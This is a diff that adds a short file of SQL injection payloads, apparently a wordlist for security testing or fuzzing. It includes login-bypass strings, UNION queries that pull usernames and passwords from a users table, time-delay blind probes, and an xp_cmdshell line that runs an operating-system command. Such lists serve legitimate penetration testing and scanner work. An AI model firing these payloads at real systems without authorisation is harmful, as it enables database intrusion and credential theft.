@@ -1,0 +1,22 @@
+'
+"
+'--
+'#
+' OR '1'='1'
+' OR 1=1--
+' OR '1'='1' --
+' OR 1=1#
+' OR 1=1/*
+' OR 'x'='x'
+' OR 1=1 LIMIT 1;--
+'; EXEC xp_cmdshell('whoami'); --
+' AND 1=0 UNION SELECT NULL, username || '~' || password FROM users--
+' UNION SELECT null, null, null--
+' UNION SELECT 1,2,3--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' AND 1=1--
+1' OR '1'='1'--
+' OR EXISTS(SELECT * FROM users)--
+' OR (SELECT COUNT(*) FROM information_schema.tables) > 0--
